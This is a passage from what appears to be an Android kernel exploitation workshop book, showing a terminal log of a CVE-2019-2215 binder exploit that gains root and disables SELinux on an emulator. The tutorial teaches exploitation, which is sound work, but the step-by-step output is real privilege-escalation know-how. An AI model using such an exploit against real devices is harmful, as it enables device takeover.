    <span class="token punctuation">}</span>

    <span class="token comment">//</span>
    <span class="token comment">// Wait for the child process to exit</span>
    <span class="token comment">//</span>

    <span class="token function">wait</span><span class="token punctuation">(</span><span class="token keyword">nullptr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>I hope know you have a better idea how we used <strong>scoped write</strong> to achieve controlled <strong>arbitrary write</strong> and clobbered <code>addr_limit</code> with <code>0xFFFFFFFFFFFFFFFE</code>.</p>
<h2 id="exploit-in-action">Exploit In Action </h2>
<p>Let&apos;s see the exploit in action.</p>
<pre class="language-"><code class="lang-bash">ashfaq@hacksys:~/workshop$ adb shell
generic_x86_64:/ $ <span class="token function">uname</span> -a                                                                                        
Linux localhost <span class="token number">4.14</span>.150+ <span class="token comment">#1 repo:q-goldfish-android-goldfish-4.14-dev SMP PREEMPT Tue Apr x86_64</span>
generic_x86_64:/ $ <span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">2000</span><span class="token punctuation">(</span>shell<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">2000</span><span class="token punctuation">(</span>shell<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">2000</span><span class="token punctuation">(</span>shell<span class="token punctuation">)</span>,1004<span class="token punctuation">(</span>input<span class="token punctuation">)</span>,1007<span class="token punctuation">(</span>log<span class="token punctuation">)</span>,1011<span class="token punctuation">(</span>adb<span class="token punctuation">)</span>,1015<span class="token punctuation">(</span>sdcard_rw<span class="token punctuation">)</span>,1028<span class="token punctuation">(</span>sdcard_r<span class="token punctuation">)</span>,3001<span class="token punctuation">(</span>net_bt_admin<span class="token punctuation">)</span>,3002<span class="token punctuation">(</span>net_bt<span class="token punctuation">)</span>,3003<span class="token punctuation">(</span>inet<span class="token punctuation">)</span>,3006<span class="token punctuation">(</span>net_bw_stats<span class="token punctuation">)</span>,3009<span class="token punctuation">(</span>readproc<span class="token punctuation">)</span>,3011<span class="token punctuation">(</span>uhid<span class="token punctuation">)</span> <span class="token assign-left variable">context</span><span class="token operator">=</span>u:r:shell:s0
generic_x86_64:/ $ getenforce                                                                                      
Enforcing
generic_x86_64:/ $ <span class="token builtin class-name">cd</span> /data/local/tmp
generic_x86_64:/data/local/tmp $ ./cve-2019-2215-exploit                                                         

  <span class="token comment">## # # ###     ### ###  #  ###     ### ###  #  ### </span>
 <span class="token comment">#   # # #         # # # ##  # #       #   # ##  #   </span>
 <span class="token comment">#   # # ##  ### ### # #  #  ### ### ### ###  #  ### </span>
 <span class="token comment">#   # # #       #   # #  #    #     #   #    #    # </span>
  <span class="token comment">##  #  ###     ### ### ### ###     ### ### ### ### </span>
                                        @HackSysTeam 

<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Binding to 0th core
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Opening: /dev/binder
    <span class="token punctuation">[</span>*<span class="token punctuation">]</span> m_binder_fd: 0x3
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Creating event poll
    <span class="token punctuation">[</span>*<span class="token punctuation">]</span> m_epoll_fd: 0x4
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Setting up pipe
    <span class="token punctuation">[</span>*<span class="token punctuation">]</span> Pipe created successfully
    <span class="token punctuation">[</span>*<span class="token punctuation">]</span> Changed the pipe capacity to: 0x1000
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Setting up iovecs
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Mapping 4GB aligned page
    <span class="token punctuation">[</span>*<span class="token punctuation">]</span> Mapped page: 0x100000000
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Linking eppoll_entry-<span class="token operator">&gt;</span>wait.entry to binder_thread-<span class="token operator">&gt;</span>wait.head
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Freeing binder_thread
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Un-linking eppoll_entry-<span class="token operator">&gt;</span>wait.entry from binder_thread-<span class="token operator">&gt;</span>wait.head
    <span class="token punctuation">[</span>*<span class="token punctuation">]</span> Wrote 0x2000 bytes
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Leaked task_struct: 0xffff888063a14b00
    <span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token operator">&amp;</span>task_struct-<span class="token operator">&gt;</span>pid: 0xffff888063a14fe8
    <span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token operator">&amp;</span>task_struct-<span class="token operator">&gt;</span>cred: 0xffff888063a15188
    <span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token operator">&amp;</span>task_struct-<span class="token operator">&gt;</span>nsproxy: 0xffff888063a151c0
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Opening: /dev/binder
    <span class="token punctuation">[</span>*<span class="token punctuation">]</span> m_binder_fd: 0x7
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Creating event poll
    <span class="token punctuation">[</span>*<span class="token punctuation">]</span> m_epoll_fd: 0x8
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Setting up socket
    <span class="token punctuation">[</span>*<span class="token punctuation">]</span> Socketpair created successfully
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Writing junk data to socket
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Setting up iovecs
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Linking eppoll_entry-<span class="token operator">&gt;</span>wait.entry to binder_thread-<span class="token operator">&gt;</span>wait.head
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Freeing binder_thread
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Un-linking eppoll_entry-<span class="token operator">&gt;</span>wait.entry from binder_thread-<span class="token operator">&gt;</span>wait.head
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Setting up pipe <span class="token keyword">for</span> kernel read/write
    <span class="token punctuation">[</span>*<span class="token punctuation">]</span> Pipe created successfully
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Verifying arbitrary read/write primitive
    <span class="token punctuation">[</span>*<span class="token punctuation">]</span> currentPid: <span class="token number">7039</span>
    <span class="token punctuation">[</span>*<span class="token punctuation">]</span> expectedPid: <span class="token number">7039</span>
    <span class="token punctuation">[</span>*<span class="token punctuation">]</span> Arbitrary read/write successful
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Patching current task cred members
    <span class="token punctuation">[</span>*<span class="token punctuation">]</span> cred: 0xffff888066e016c0
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Verifying <span class="token keyword">if</span> selinux enforcing is enabled
    <span class="token punctuation">[</span>*<span class="token punctuation">]</span> nsproxy: 0xffffffff81433ac0
    <span class="token punctuation">[</span>*<span class="token punctuation">]</span> Kernel base: 0xffffffff80200000
    <span class="token punctuation">[</span>*<span class="token punctuation">]</span> selinux_enforcing: 0xffffffff816acfe8
    <span class="token punctuation">[</span>*<span class="token punctuation">]</span> selinux enforcing is enabled
    <span class="token punctuation">[</span>*<span class="token punctuation">]</span> Disabled selinux enforcing
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Verifying <span class="token keyword">if</span> rooted
    <span class="token punctuation">[</span>*<span class="token punctuation">]</span> uid: 0x0
    <span class="token punctuation">[</span>*<span class="token punctuation">]</span> Rooting successful
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Spawning root shell
generic_x86_64:/data/local/tmp <span class="token comment"># id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span>,1004<span class="token punctuation">(</span>input<span class="token punctuation">)</span>,1007<span class="token punctuation">(</span>log<span class="token punctuation">)</span>,1011<span class="token punctuation">(</span>adb<span class="token punctuation">)</span>,1015<span class="token punctuation">(</span>sdcard_rw<span class="token punctuation">)</span>,1028<span class="token punctuation">(</span>sdcard_r<span class="token punctuation">)</span>,3001<span class="token punctuation">(</span>net_bt_admin<span class="token punctuation">)</span>,3002<span class="token punctuation">(</span>net_bt<span class="token punctuation">)</span>,3003<span class="token punctuation">(</span>inet<span class="token punctuation">)</span>,3006<span class="token punctuation">(</span>net_bw_stats<span class="token punctuation">)</span>,3009<span class="token punctuation">(</span>readproc<span class="token punctuation">)</span>,3011<span class="token punctuation">(</span>uhid<span class="token punctuation">)</span> <span class="token assign-left variable">context</span><span class="token operator">=</span>u:r:shell:s0
generic_x86_64:/data/local/tmp <span class="token comment"># getenforce                                                                        </span>
Permissive
generic_x86_64:/data/local/tmp <span class="token comment">#</span>
</code></pre>
<p>You can see that we have achieved <code>root</code> and disabled <strong>SELinux</strong>.</p>

                                
                                </section>
                            
    </div>
    <div class="search-results">
        <div class="has-results">
            
            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
            <ul class="search-results-list"></ul>
            
        </div>
        <div class="no-results">
            
            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
            
        </div>
    </div>
</div>

                        </div>
                    </div>
                
            </div>

            
                
                <a href="root-cause-analysis.html#kernel-tracing" class="navigation navigation-prev " aria-label="Previous page: Kernel Tracing">
                    <i class="fa fa-angle-left"></i>
                </a>
                
                
                <a href="exploitation.html#primitive" class="navigation navigation-next " aria-label="Next page: Primitive">
                    <i class="fa fa-angle-right"></i>
                </a>
                
            
        
    </div>

    <script>
        var gitbook = gitbook || [];
        gitbook.push(function() {
            gitbook.page.hasChanged({"page":{"title":"Exploitation","level":"1.8","depth":1,"next":{"title":"Primitive","level":"1.8.1","depth":2,"anchor":"#primitive","path":"chapters/exploitation.md","ref":"chapters/exploitation.md#primitive","articles":[]},"previous":{"title":"Kernel Tracing","level":"1.7.4.3","depth":3,"anchor":"#kernel-tracing","path":"chapters/root-cause-analysis.md","ref":"chapters/root-cause-analysis.md#kernel-tracing","articles":[]},"dir":"ltr"},"config":{"plugins":["-livereload","-highlight","collapsible-chapters","github","sharing","ga","prism","prism-themes"],"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"prism":{"css":["prism-themes/themes/prism-atom-dark.css"]},"github":{"url":"https://github.com/cloudfuzz/android-kernel-exploitation"},"search":{},"collapsible-chapters":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"fontsettings":{"theme":"night","family":"sans","size":2},"prism-themes":{},"ga":{"configuration":"auto","token":"UA-163782039-1"},"sharing":{"all":["facebook","google","twitter","weibo","instapaper"],"facebook":true,"google":false,"instapaper":false,"twitter":true,"vk":false,"weibo":false},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"theme":"default","author":"Ashfaq Ansari (@HackSysTeam)","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"Android Kernel Exploitation","gitbook":"*"},"file":{"path":"chapters/exploitation.md","mtime":"2020-12-07T08:09:25.374Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2020-12-07T08:10:05.383Z"},"basePath":"..","book":{"language":""}});
        });
    </script>
</div>

        
    <script src="../gitbook/gitbook.js"></script>
    <script src="../gitbook/theme.js"></script>
    
        
        <script src="../gitbook/gitbook-plugin-collapsible-chapters/collapsible-chapters.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-github/plugin.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-sharing/buttons.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-ga/plugin.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-search/search-engine.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-search/search.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-lunr/lunr.min.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-lunr/search-lunr.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
        
    

    </body>
</html>

